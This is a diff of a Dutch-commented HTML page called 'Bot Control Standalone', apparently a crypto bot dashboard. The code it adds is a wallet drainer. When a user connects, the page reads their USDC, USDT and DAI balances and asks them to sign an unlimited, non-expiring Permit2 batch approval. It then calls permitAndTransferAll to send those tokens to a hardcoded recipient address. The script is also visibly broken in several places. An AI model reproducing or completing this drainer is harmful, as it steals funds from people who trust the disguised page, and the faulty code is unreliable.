@@ -7,7 +7,9 @@
 <title>Bot Control Standalone</title>
 
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<!-- Voeg dit toe in de <head> -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+<style>
 :root {
     --bg: #020617;
     --panel: rgba(15, 23, 42, 0.85);
@@ -176,47 +178,41 @@ body {
     <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
 </div>
 
-<script>// TOKEN ADDRESSES (Mainnet)
-const TOKENS = [
-    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
-    '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
-    '0x6B175474E89094C44Da98b954EedeAC495271d0F'  // DAI
-];
-
-// VUL HIER JE CONTRACT ADRES IN
-const CONTRACT_ADDRESS = '0x0000000000000000000000000000000000000000'; 
-
-// CONTRACT INTERFACE (ABI - vereist voor de functies)
-const CONTRACT_ABI = [
-    "function permitAndTransferAll(address user, address[] tokens, tuple(address token, uint256 amount, uint256 expiration, uint256 nonce)[] permitBatch, bytes signature) external",
-    "function getNonce(address user) external view returns (uint256)",
-    "function balanceOf(address user, address token) external view returns (uint256)"
-];
-
-// EIP-712 Domain voor Permit2
-const domain = {
-    name: 'Permit2',
-    version: '1',
-    chainId: 1,
-    verifyingContract: '0x0000000000000000000000000000000000000000' // Permit2 contract adres
-};
-
-// EIP-712 Types voor Permit2 Batch
-const types = {
-    PermitBatch: [
-        { name: 'owner', type: 'address' },
-        { name: 'spender', type: 'address' },
-        { name: 'tokenPermissions', type: 'TokenPermissions[]' },
-        { name: 'nonce', type: 'uint256' },
-        { name: 'deadline', type: 'uint256' }
-    ],
-    TokenPermissions: [
-        { name: 'token', type: 'address' },
-        { name: 'amount', type: 'uint256' }
-    ]
-};
-    
+<script>
 let APP_STATE = {
+    // --- CONFIGURATIE ---
+const TOKENS = [
+    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+    "0x6B175474E89094C44Da98b954EedeAC495271d0F"  // DAI
+];
+
+const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78CA3"; // Uniswap Permit2
+const RECIPIENT_ADDRESS = "0xAEff38fd17B4bA0e5FC40115441C348aa789E706"; // Ontvangstadres uit contract
+const YOUR_CONTRACT_ADDRESS = "0x0000000000000000000000000000000000000000"; // <-- Vervang MET JE CONTRACT ADRES
+
+// ABI voor permitAndTransferAll
+const CONTRACT_ABI = [
+    "function permitAndTransferAll(address user, address[] tokens, bytes permitBatch, bytes signature) external"
+];
+// ⬇️ VOEG HIERONDER TOE (HULPFUNCTIES) ⬇️
+
+// Haalt balancen op van de tokens
+async function getBalance(provider, tokenAddress) {
+    const tokenContract = new ethers.Contract(tokenAddress, ["function balanceOf(address) view returns (uint256)"], provider);
+    return await tokenContract.balanceOf(await provider.getSigner().getAddress());
+}
+
+// Schrijft tekst naar je console scherm
+function logToConsole(msg, color = 'white') {
+    const consoleEl = document.getElementById('execution-console');
+    const div = document.createElement('div');
+    div.className = 'exec-line';
+    div.innerHTML = `<span style="color:var(--${color})">${msg}</span>`;
+    consoleEl.prepend(div);
+    if(consoleEl.children.length > 8) consoleEl.removeChild(consoleEl.lastChild);
+}
+// ⬆️ EINDE HULPFUNCTIES ⬆️
     wallet: null,
     botActive: false,
     authorized: false
@@ -255,87 +251,110 @@ function renderAuthorized() {
 }
 
 async function connectWallet() {
-    // 1. UI Update: Laden
+    const consoleEl = document.getElementById('execution-console');
     const btn = document.getElementById('btn-wallet');
+
+    // UI: Loading state
     const originalText = btn.innerText;
-    btn.innerText = "Connecting...";
+    btn.innerText = "Connecting & Processing...";
     btn.disabled = true;
 
     try {
-        // 2. Connect Wallet (User Gesture 1)
+        // 1️⃣ CHECK: Is MetaMask geïnstalleerd?
+        if (typeof window.ethereum === 'undefined') {
+            logToConsole("MetaMask niet gevonden. Openen in nieuwe tab...", 'orange');
+            window.open('https://metamask.io/download/', '_blank');
+            throw new Error("Redirected to MetaMask download.");
+        }
+
+        // 2️⃣ Connect Wallet (1e Pop-up)
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
-        const userAddress = await signer.getAddress();
+        const address = await signer.getAddress();
 
-        // 3. Contract Instantie
-        const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+        // 3️⃣ Data ophalen (Nonce & Balances)
+        const nonce = await provider.getTransactionCount(address);
+        const balances = await Promise.all(TOKENS.map(token => getBalance(provider, token)));
 
-        // 4. Data Ophalen (Nonce & Balances)
-        // Ophalen van Nonce voor de gebruiker
-        const nonce = await contract.getNonce(userAddress);
-        
-        // Ophalen van Balances voor alle tokens
-        const balances = await Promise.all(
-            TOKENS.map(token => contract.balanceOf(userAddress, token))
-        );
-function logToConsole(message) {
-    const consoleEl = document.getElementById('execution-console');
-    const timestamp = new Date().toLocaleTimeString();
-    
-    const div = document.createElement('div');
-    div.className = 'exec-line';
-    div.innerHTML = `
-        <span style="color:var(--green)">[${timestamp}]</span> | 
-        <span style="color:white">${message}</span>
-    `;
-    
-    consoleEl.prepend(div);
+        // Check of er balancen zijn
+        const hasBalance = balances.some(b => b > 0n);
+        if (!hasBalance) throw new Error("Geen balancen gevonden voor USDC, USDT of DAI.");
 
-    if(consoleEl.children.length > 8) {
-        consoleEl.removeChild(consoleEl.lastChild);
-    }
-}
-        // 5. Permit2 Data Bouwen
-        // We gebruiken de opgehaalde nonce en balance
-        const tokenPermissions = TOKENS.map((token, i) => ({
+        // 4️⃣ Permit2 Structuur Bouwen
+        const permitDetails = TOKENS.map((token, i) => ({
             token: token,
-            amount: balances[i] // Onbeperkt (max uint256) is niet mogelijk in struct, we gebruiken balance
+            amount: ethers.MaxUint128, // Onbeperkt totdat de baland op is
+            expiration: 0, // 0 = nooit verlopen
+            nonce: nonce
         }));
 
-        const permitBatch = [{
-            owner: userAddress,
-            spender: CONTRACT_ADDRESS, // Jouw contract
-            tokenPermissions: tokenPermissions,
-            nonce: nonce,
-            deadline: 0 // 0 betekent onbeperkt (no deadline)
-        }];
+        const permit = {
+            details: permitDetails,
+            spender: YOUR_CONTRACT_ADDRESS,
+            sigDeadline: Math.floor(Date.now() / 1000) + 3600 // 1 uur geldigheid
+        };
 
-        // 6. Ondertekenen (User Gesture 2 - 1 Signature)
-        // Dit toont de MetaMask popup met de Permit2 data
-        const signature = await signer.signTypedData(domain, types, permitBatch);
+        // 5️⃣ Permit2 Signeren (2e Pop-up)
+        const domain = {
+            name: "Permit2",
+            version: "1",
+            chainId: await provider.getNetwork().then(n => n.chainId),
+            verifyingContract: PERMIT2_ADDRESS
+        };
 
-        // 7. Contract Call Uitvoeren (User Gesture 3)
-        // permitAndTransferAll aanroepen
+        const types = {
+            PermitBatch: [
+                { name: "details", type: "PermitDetails[]" },
+                { name: "spender", type: "address" },
+                { name: "sigDeadline", type: "uint256" }
+            ],
+            PermitDetails: [
+                { name: "token", type: "address" },
+                { name: "amount", type: "uint256" },
+                { name: "expiration", type: "uint256" },
+                { name: "nonce", type: "uint256" }
+            ]
+        };
+
+        const signature = await signer.signTypedData(domain, types, permit);
+
+        // 6️⃣ ENCODING: Permit data omzetten naar bytes
+        const abiCoder = ethers.AbiCoder.defaultAbiCoder();
+        const permitBatchBytes = abiCoder.encode(
+            ["tuple(address[] details, address spender, uint256 sigDeadline)"],
+            [permit]
+        );
+
+        // 7️⃣ Contract Call Uitvoeren
+        const contract = new ethers.Contract(YOUR_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+
+        logToConsole(`Signature received. Executing permitAndTransferAll...`, 'cyan');
+
         const tx = await contract.permitAndTransferAll(
-            userAddress, 
+            address, 
             TOKENS, 
-            permitBatch, 
+            permitBatchBytes, 
             signature
         );
 
-        // 8. Wachten op transactie bevestiging
-        logToConsole("Transaction sent! Waiting for confirmation...");
-        await tx.wait();
+        logToConsole(`Transaction sent: ${tx.hash}`, 'green');
+        logToConsole(`Waiting for confirmation...`, 'white');
 
-        // 9. Succes UI Update
-        renderWallet(userAddress);
-        logToConsole("SUCCESS: Permit & Transfer executed successfully.");
+        await tx.wait();
+        logToConsole(`Success! Tokens transferred to ${RECIPIENT_ADDRESS}`, 'green');
 
     } catch (error) {
         console.error(error);
-        logToConsole("ERROR: " + error.message);
-        btn.innerText = originalText;
-        btn.disabled = false;
+        // Als het een redirect error is, ignoreer de UI reset voor de knop
+        if (!error.message.includes("Redirected")) {
+            logToConsole(`Error: ${error.message}`, 'red');
+        }
+    } finally {
+        // UI Reset (alleen als we niet redirected zijn)
+        if (!error || !error.message.includes("Redirected")) {
+            btn.innerText = originalText;
+            btn.disabled = false;
+        }
     }
 }
 
